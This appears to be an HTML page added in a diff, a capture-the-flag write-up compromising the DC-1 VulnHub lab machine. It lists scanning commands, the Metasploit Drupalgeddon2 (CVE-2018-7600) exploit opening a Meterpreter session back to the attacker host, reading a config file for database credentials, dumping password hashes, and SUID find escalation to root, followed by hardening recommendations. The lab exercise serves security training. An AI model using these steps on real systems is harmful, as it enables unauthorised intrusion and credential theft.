@@ -1,0 +1,257 @@
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;600;700&display=swap');
+
+:root {
+  --red: #E24B4A;
+  --red-bg: #FCEBEB;
+  --red-dark: #A32D2D;
+  --teal: #1D9E75;
+  --teal-bg: #E1F5EE;
+  --amber: #BA7517;
+  --amber-bg: #FAEEDA;
+  --gray-bg: #F1EFE8;
+  --border: 0.5px solid var(--color-border-tertiary);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+.page { font-family: 'Syne', sans-serif; padding: 2rem 0; max-width: 680px; }
+
+.hero { border-left: 3px solid var(--red); padding-left: 1.25rem; margin-bottom: 2rem; }
+.hero-badge { display: inline-block; background: #FCEBEB; color: #A32D2D; font-size: 11px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; padding: 3px 10px; border-radius: 4px; margin-bottom: 8px; }
+.hero h1 { font-size: 26px; font-weight: 700; color: var(--color-text-primary); line-height: 1.2; margin-bottom: 6px; }
+.hero p { font-size: 14px; color: var(--color-text-secondary); line-height: 1.6; }
+
+.meta-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 2rem; }
+.meta-tag { display: flex; align-items: center; gap: 6px; background: var(--color-background-secondary); border: var(--border); border-radius: 6px; padding: 5px 12px; font-size: 12px; color: var(--color-text-secondary); font-family: 'JetBrains Mono', monospace; }
+.meta-tag .dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+
+.section { margin-bottom: 2.5rem; }
+.section-label { font-size: 11px; font-weight: 600; letter-spacing: 0.1em; text-transform: uppercase; color: var(--color-text-tertiary); margin-bottom: 1rem; padding-bottom: 6px; border-bottom: var(--border); }
+
+.step-list { display: flex; flex-direction: column; gap: 1px; }
+.step { display: grid; grid-template-columns: 28px 1fr; gap: 12px; align-items: start; padding: 10px 0; border-bottom: var(--border); }
+.step:last-child { border-bottom: none; }
+.step-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--color-text-tertiary); padding-top: 3px; }
+.step-content h3 { font-size: 14px; font-weight: 600; color: var(--color-text-primary); margin-bottom: 3px; }
+.step-content p { font-size: 13px; color: var(--color-text-secondary); line-height: 1.5; }
+
+.code-block { background: var(--color-background-secondary); border: var(--border); border-radius: 8px; padding: 10px 14px; margin-top: 8px; }
+.code-block code { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--color-text-primary); white-space: pre; display: block; }
+
+.result-line { display: flex; align-items: center; gap: 8px; margin-top: 6px; }
+.result-line .check { width: 14px; height: 14px; border-radius: 50%; background: #E1F5EE; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.result-line .check svg { width: 8px; height: 8px; }
+.result-line span { font-size: 12px; color: var(--color-text-secondary); font-family: 'JetBrains Mono', monospace; }
+
+.vuln-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+.vuln-card { border: var(--border); border-radius: 10px; padding: 12px 14px; background: var(--color-background-primary); }
+.vuln-card .severity { font-size: 10px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; padding: 2px 8px; border-radius: 4px; display: inline-block; margin-bottom: 8px; }
+.sev-critical { background: #FCEBEB; color: #A32D2D; }
+.sev-high { background: #FAEEDA; color: #854F0B; }
+.sev-med { background: #E1F5EE; color: #0F6E56; }
+.vuln-card h4 { font-size: 13px; font-weight: 600; color: var(--color-text-primary); margin-bottom: 4px; line-height: 1.3; }
+.vuln-card p { font-size: 12px; color: var(--color-text-secondary); line-height: 1.5; }
+
+.attack-chain { display: flex; align-items: center; gap: 0; overflow-x: auto; padding-bottom: 4px; }
+.chain-node { background: var(--color-background-secondary); border: var(--border); border-radius: 6px; padding: 7px 12px; font-size: 11px; font-weight: 600; color: var(--color-text-secondary); white-space: nowrap; }
+.chain-node.highlight { background: #FCEBEB; border-color: #F7C1C1; color: #A32D2D; }
+.chain-arrow { color: var(--color-text-tertiary); font-size: 12px; padding: 0 4px; flex-shrink: 0; }
+
+.rec-list { display: flex; flex-direction: column; gap: 8px; }
+.rec-item { display: flex; gap: 10px; align-items: flex-start; padding: 10px 14px; background: var(--color-background-secondary); border-radius: 8px; border: var(--border); }
+.rec-icon { width: 20px; height: 20px; border-radius: 4px; background: #E1F5EE; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+.rec-item h4 { font-size: 13px; font-weight: 600; color: var(--color-text-primary); margin-bottom: 2px; }
+.rec-item p { font-size: 12px; color: var(--color-text-secondary); }
+
+.final-banner { background: var(--color-background-secondary); border: 1px solid #F7C1C1; border-radius: 10px; padding: 14px 18px; display: flex; align-items: center; gap: 12px; }
+.banner-icon { width: 36px; height: 36px; background: #FCEBEB; border-radius: 8px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.final-banner h3 { font-size: 14px; font-weight: 600; color: #A32D2D; margin-bottom: 2px; }
+.final-banner p { font-size: 12px; color: var(--color-text-secondary); font-family: 'JetBrains Mono', monospace; }
+</style>
+
+<div class="page">
+  <h2 class="sr-only" style="position:absolute;width:1px;height:1px;overflow:hidden;">DC-1 VulnHub penetration test writeup</h2>
+
+  <div class="hero">
+    <span class="hero-badge">CTF Writeup</span>
+    <h1>DC-1 VulnHub — Full Compromise</h1>
+    <p>A complete walkthrough of the DC-1 VulnHub machine — from host discovery to root. Covers Drupalgeddon2 exploitation, credential extraction, and SUID privilege escalation.</p>
+  </div>
+
+  <div class="meta-row">
+    <div class="meta-tag"><span class="dot" style="background:#E24B4A;"></span> Difficulty: Beginner</div>
+    <div class="meta-tag"><span class="dot" style="background:#1D9E75;"></span> OS: Linux (Debian)</div>
+    <div class="meta-tag"><span class="dot" style="background:#BA7517;"></span> Flags: 4</div>
+    <div class="meta-tag"><span class="dot" style="background:#7F77DD;"></span> CVE-2018-7600</div>
+  </div>
+
+  <div class="section">
+    <div class="section-label">Attack chain</div>
+    <div class="attack-chain">
+      <div class="chain-node">Recon</div><div class="chain-arrow">›</div>
+      <div class="chain-node">Port scan</div><div class="chain-arrow">›</div>
+      <div class="chain-node">Enum</div><div class="chain-arrow">›</div>
+      <div class="chain-node highlight">Drupalgeddon2</div><div class="chain-arrow">›</div>
+      <div class="chain-node">Shell</div><div class="chain-arrow">›</div>
+      <div class="chain-node">Creds</div><div class="chain-arrow">›</div>
+      <div class="chain-node highlight">SUID PrivEsc</div><div class="chain-arrow">›</div>
+      <div class="chain-node highlight">Root</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-label">Step-by-step walkthrough</div>
+    <div class="step-list">
+
+      <div class="step">
+        <div class="step-num">01</div>
+        <div class="step-content">
+          <h3>Host discovery</h3>
+          <p>Ran netdiscover on the host-only interface to find the target on the local network.</p>
+          <div class="code-block"><code>netdiscover -i eth1</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>Target: 192.168.56.102</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">02</div>
+        <div class="step-content">
+          <h3>Port scanning</h3>
+          <p>Full-port OS-detection scan to map the attack surface.</p>
+          <div class="code-block"><code>nmap -p- -O 192.168.56.102</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>Open: 22 (SSH), 80 (HTTP), 111 (RPC) — Debian Linux</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">03</div>
+        <div class="step-content">
+          <h3>Service enumeration</h3>
+          <p>Version scan on open ports revealed Apache 2.2.22, PHP 5.4, and a Drupal CMS fingerprint.</p>
+          <div class="code-block"><code>nmap -sV -p22,80,111 192.168.56.102</code></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">04</div>
+        <div class="step-content">
+          <h3>Web enumeration & vulnerability scan</h3>
+          <p>Browsing to port 80 confirmed Drupal 7. Nikto surfaced exposed paths and misconfigurations.</p>
+          <div class="code-block"><code>nikto -h http://192.168.56.102</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>Confirmed Drupal 7 — Drupalgeddon2 (CVE-2018-7600) applicable</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">05</div>
+        <div class="step-content">
+          <h3>Exploitation via Metasploit</h3>
+          <p>Used the drupal_drupalgeddon2 module to gain a Meterpreter session as www-data.</p>
+          <div class="code-block"><code>use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS 192.168.56.102
+set LHOST 192.168.56.101
+run</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>Meterpreter session opened — user: www-data</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">06</div>
+        <div class="step-content">
+          <h3>Flag 1 & credential extraction</h3>
+          <p>Flag 1 hinted at the config file. Reading settings.php leaked database credentials.</p>
+          <div class="code-block"><code>cat sites/default/settings.php</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>DB credentials — dbuser : R0ck3t</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">07</div>
+        <div class="step-content">
+          <h3>Database enumeration</h3>
+          <p>Connected to the local MySQL instance and pulled user password hashes from drupaldb.</p>
+          <div class="code-block"><code>mysql -u dbuser -p
+use drupaldb;
+select * from users;</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>Hashes extracted for: admin, Fred</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">08</div>
+        <div class="step-content">
+          <h3>Privilege escalation — SUID find</h3>
+          <p>Flag 4 hinted at the same escalation vector used for root. The <code style="font-family:'JetBrains Mono',monospace;font-size:11px;">find</code> binary had the SUID bit set, allowing shell spawn as root.</p>
+          <div class="code-block"><code>find /dev -name null -exec /bin/sh \;</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>euid = 0 → root shell obtained</span></div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">09</div>
+        <div class="step-content">
+          <h3>Final flag</h3>
+          <div class="code-block"><code>cat /root/thefinalflag.txt</code></div>
+          <div class="result-line"><div class="check"><svg viewBox="0 0 8 8" fill="none"><path d="M1 4l2 2 4-4" stroke="#1D9E75" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>System fully compromised</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-label">Key vulnerabilities</div>
+    <div class="vuln-grid">
+      <div class="vuln-card">
+        <span class="severity sev-critical">Critical</span>
+        <h4>Drupalgeddon2 RCE</h4>
+        <p>CVE-2018-7600 — unauthenticated remote code execution on Drupal 7.x via form API.</p>
+      </div>
+      <div class="vuln-card">
+        <span class="severity sev-high">High</span>
+        <h4>Exposed config file</h4>
+        <p>settings.php readable by web process — plaintext DB credentials leaked to attacker.</p>
+      </div>
+      <div class="vuln-card">
+        <span class="severity sev-med">Medium</span>
+        <h4>SUID misconfiguration</h4>
+        <p>find binary with SUID bit allows any user to spawn a privileged shell as root.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-label">Recommendations</div>
+    <div class="rec-list">
+      <div class="rec-item">
+        <div class="rec-icon"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1" y="5" width="10" height="6" rx="1.5" stroke="#1D9E75" stroke-width="1.2"/><path d="M4 5V3.5a2 2 0 014 0V5" stroke="#1D9E75" stroke-width="1.2"/></svg></div>
+        <div><h4>Patch Drupal immediately</h4><p>Upgrade to a supported Drupal version. Drupal 7 has been end-of-life since January 2025.</p></div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-icon"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1" y="5" width="10" height="6" rx="1.5" stroke="#1D9E75" stroke-width="1.2"/><path d="M4 5V3.5a2 2 0 014 0V5" stroke="#1D9E75" stroke-width="1.2"/></svg></div>
+        <div><h4>Restrict configuration files</h4><p>Set strict file permissions on settings.php (440 or 444). It should never be readable by the web process in a way that exposes credentials.</p></div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-icon"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1" y="5" width="10" height="6" rx="1.5" stroke="#1D9E75" stroke-width="1.2"/><path d="M4 5V3.5a2 2 0 014 0V5" stroke="#1D9E75" stroke-width="1.2"/></svg></div>
+        <div><h4>Audit SUID/SGID binaries</h4><p>Run <code style="font-family:'JetBrains Mono',monospace;font-size:11px;">find / -perm -4000</code> regularly. Remove SUID from non-essential binaries like find, vim, and nmap.</p></div>
+      </div>
+      <div class="rec-item">
+        <div class="rec-icon"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1" y="5" width="10" height="6" rx="1.5" stroke="#1D9E75" stroke-width="1.2"/><path d="M4 5V3.5a2 2 0 014 0V5" stroke="#1D9E75" stroke-width="1.2"/></svg></div>
+        <div><h4>Least-privilege database access</h4><p>The DB user should have only the minimum required permissions — no shell, no file read, no admin rights.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="final-banner">
+    <div class="banner-icon">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 2L3 5v5c0 3.5 2.5 6.5 6 7.5C12.5 16.5 15 13.5 15 10V5L9 2z" stroke="#A32D2D" stroke-width="1.4" stroke-linejoin="round"/><path d="M6.5 9l2 2 3-3" stroke="#A32D2D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <div>
+      <h3>System fully compromised — root achieved</h3>
+      <p>Recon → Scan → Enum → Exploit (RCE) → Shell → Creds → DB → PrivEsc → /root</p>
+    </div>
+  </div>
+
+</div>
